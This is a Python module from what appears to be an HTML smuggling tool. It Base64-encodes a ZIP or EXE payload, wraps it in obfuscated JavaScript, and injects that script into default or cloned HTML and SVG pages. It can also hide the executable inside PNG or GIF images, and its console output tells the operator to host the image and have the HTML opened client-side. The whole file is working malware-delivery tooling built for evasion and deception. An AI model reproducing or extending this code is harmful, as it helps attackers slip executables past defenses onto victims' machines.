from core.logging.debug import logging
from core.utilities.utils import Base64Encode, ObfuscateJS, embed, IdentifyFileType
from core.operations.genJS import GetJS
from core.operations.genTemplate import SaveAsTemplate
from core.visualization.visuals import VisualizePNG
import os
import re

# Constants
USING_CUSTOM_TEMPLATE = "Using custom {} template."
INVALID_FILE_TYPE = "Invalid file type: Expected HTML or SVG."
INVALID_CUSTOM_FILE = "Invalid custom file path."

# Common Operations Function
def GenerateObfuscatedJS(PathToZIPFile, args):
    EncodedString = Base64Encode(PathToZIPFile)
    JScode = GetJS(EncodedString, args.o, args.t, args.u)
    return ObfuscateJS(JScode)

def HandleCustomTemplate(args, ObfuscatedCodeJS, OutputFile):
    FileType = IdentifyFileType(args.e)
    if FileType == 'html':
        logging.debug(USING_CUSTOM_TEMPLATE.format('HTML'))
        HandleCustomHTML(args.e, ObfuscatedCodeJS, OutputFile)
    elif FileType == 'svg':
        logging.debug(USING_CUSTOM_TEMPLATE.format('SVG'))
        HandleCustomSVG(args.e, ObfuscatedCodeJS, OutputFile)
    else:
        logging.error(INVALID_FILE_TYPE)
        raise ValueError(INVALID_FILE_TYPE)

def HandleHTML(args, PathToZIPFile):
    logging.debug("Handling HTML type.")
    ObfuscatedCodeJS = GenerateObfuscatedJS(PathToZIPFile, args)
    
    if args.e:
        HandleCustomTemplate(args, ObfuscatedCodeJS, args.f)
    else:
        logging.debug("Using default HTML template.")
        SaveAsTemplate(ObfuscatedCodeJS, args.t, args.f)

def HandleSVG(args, PathToZIPFile):
    logging.debug("Handling SVG type.")
    ObfuscatedCodeJS = GenerateObfuscatedJS(PathToZIPFile, args)
    
    if args.e:
        HandleCustomTemplate(args, ObfuscatedCodeJS, args.f)
    else:
        logging.debug("Using default SVG template.")
        SaveAsTemplate(ObfuscatedCodeJS, args.t, args.f)

def HandleCustomHTML(CustomHTMLPath, ObfuscatedCodeJS, CustomHTMLEmbedded):
    try:
        with open(CustomHTMLPath, "r", encoding='utf-8') as file:
            ClonedHTML = file.read()

        index = ClonedHTML.rfind("</body>")
        if index == -1:
            print("Warning: </body> tag not found. Adding <body> tags.")
            CustomFinalHTML = ClonedHTML + f"<body><script>{ObfuscatedCodeJS}</script></body>"
        else:
            CustomFinalHTML = ClonedHTML[:index] + f"<script>{ObfuscatedCodeJS}</script>" + ClonedHTML[index:]
        
        with open(CustomHTMLEmbedded, "w") as file:
            file.write(CustomFinalHTML)
    except IOError as e:
        logging.error(f"Custom HTML file operation failed: {e}")
        raise

def HandleCustomSVG(CustomSVGPath, ObfuscatedCodeJS, CustomSVGEmbedded):
    try:
        with open(CustomSVGPath, "r", encoding='utf-8') as file:
            ClonedSVG = file.read()

        # Regex to find <script> tag with CDATA section inside
        Regex = r"<script type=['\"]text/javascript['\"]><!\[CDATA\[.*?\]\]></script>"
        match = re.search(Regex, ClonedSVG, re.DOTALL)

        if match:
            # Extract the existing script content and replace with new JS
            ScriptContent = match.group()
            NewScriptContent = re.sub(r"<!\[CDATA\[.*?\]\]>", f"<![CDATA[{ObfuscatedCodeJS}]]>", ScriptContent, flags=re.DOTALL)
            CustomFinalSVG = ClonedSVG.replace(ScriptContent, NewScriptContent)
        else:
            raise ValueError("Invalid SVG file: <script> tag with CDATA not found.")
        
        with open(CustomSVGEmbedded, "w", encoding='utf-8') as file:
            file.write(CustomFinalSVG)

    except IOError as e:
        logging.error(f"Custom SVG file operation failed: {e}")
        raise

def HandlePNG(args, PathToZIPFile):
    logging.debug("Handling PNG type.")
    
    # Validate PNG arguments
    if args.u and args.png:
        raise ValueError("You can only specify either -u (URL) or -png (local file path), not both.")
    elif not args.u and not args.png:
        raise ValueError("You must specify either -u (URL) or -png (local file path) when type is PNG.")
    
    InputFilePath = PathToZIPFile
    logging.debug(f"EXE path is set to : {InputFilePath}")
    EncodedString = Base64Encode(PathToZIPFile)
    
    if args.u:
        logging.debug("Using PNG URL.")
        JScode = GetJS(EncodedString, args.o, args.t, args.u)
        ObfuscatedCodeJS = ObfuscateJS(JScode)
        
    elif args.png:
        logging.debug("Using local PNG file.")
        PNGFilePath = args.png
        
        VisualizePNG(PNGFilePath, InputFilePath)
        SaveToPNGFile = "banner.png"

        embed(PNGFilePath, InputFilePath, SaveToPNGFile, ImageType='png')
        VisualizePNG(SaveToPNGFile, InputFilePath)
        print(f"\n\033[34mSaving the PNG file to : {os.path.abspath(SaveToPNGFile)}\033[0m \033[92m [HOST THIS FILE TO YOUR CDN/WEB SERVER]\033[0m")
        
        PNGImageURL = "http://127.0.0.1:8000/banner.png"
        JScode = GetJS(EncodedString, args.o, args.t, PNGImageURL)
        ObfuscatedCodeJS = ObfuscateJS(JScode)

    # Check if custom HTML/SVG template is used
    if args.e:  
        FileType = IdentifyFileType(args.e)
        if FileType == 'html':
            logging.debug("Using custom HTML template.")
            HandleCustomHTML(args.e, ObfuscatedCodeJS, args.f)
        elif FileType == 'svg':
            logging.debug("Using custom SVG template.")
            HandleCustomSVG(args.e, ObfuscatedCodeJS, args.f)
    else:
        logging.debug("Using default HTML template.")
        SaveAsTemplate(ObfuscatedCodeJS, args.t, args.f)
        
    print(f"\033[34mSaving the HTML file to : {os.path.abspath(args.f)}\033[0m \033[92m [OPEN THIS FILE ON THE CLIENT-SIDE]\033[0m")
    print("\n\033[92mSuccessfully embedded EXE into PNG.\033[0m")

def HandleGIF(args, PathToZIPFile):
    logging.debug("Handling GIF type.")
    
    # Validate GIF arguments
    if args.u and args.gif:
        raise ValueError("You can only specify either -u (URL) or -gif (local file path), not both.")
    elif not args.u and not args.gif:
        raise ValueError("You must specify either -u (URL) or -gif (local file path) when type is GIF.")
    
    InputFilePath = PathToZIPFile
    logging.debug(f"EXE path is set to : {InputFilePath}")
    EncodedString = Base64Encode(PathToZIPFile)
    
    if args.u:
        logging.debug("Using GIF URL.")
        JScode = GetJS(EncodedString, args.o, args.t, args.u)
        ObfuscatedCodeJS = ObfuscateJS(JScode)
        
    elif args.gif:
        logging.debug("Using local GIF file.")
        GIFFilePath = args.gif
        
        SaveToGIFFile = "banner.gif"
        embed(GIFFilePath, InputFilePath, SaveToGIFFile, ImageType='gif')
        print(f"\n\033[34mSaving the GIF file to : {os.path.abspath(SaveToGIFFile)}\033[0m \033[92m [HOST THIS FILE TO YOUR CDN/WEB SERVER]\033[0m")

        GIFImageURL = "http://127.0.0.1:8000/banner.gif"
        JScode = GetJS(EncodedString, args.o, args.t, GIFImageURL)
        ObfuscatedCodeJS = ObfuscateJS(JScode)

    # Check if custom HTML template is used
    if args.e:  
        FileType = IdentifyFileType(args.e)
        if FileType == 'html':
            logging.debug("Using custom HTML template.")
            HandleCustomHTML(args.e, ObfuscatedCodeJS, args.f)
        elif FileType == 'svg':
            logging.debug("Using custom SVG template.")
            HandleCustomSVG(args.e, ObfuscatedCodeJS, args.f)
    else:
        logging.debug("Using default HTML template.")
        SaveAsTemplate(ObfuscatedCodeJS, args.t, args.f)
        
    print(f"\033[34mSaving the HTML file to : {os.path.abspath(args.f)}\033[0m \033[92m [OPEN THIS FILE ON THE CLIENT-SIDE]\033[0m")
    print("\n\033[92mSuccessfully embedded EXE into GIF.\033[0m")

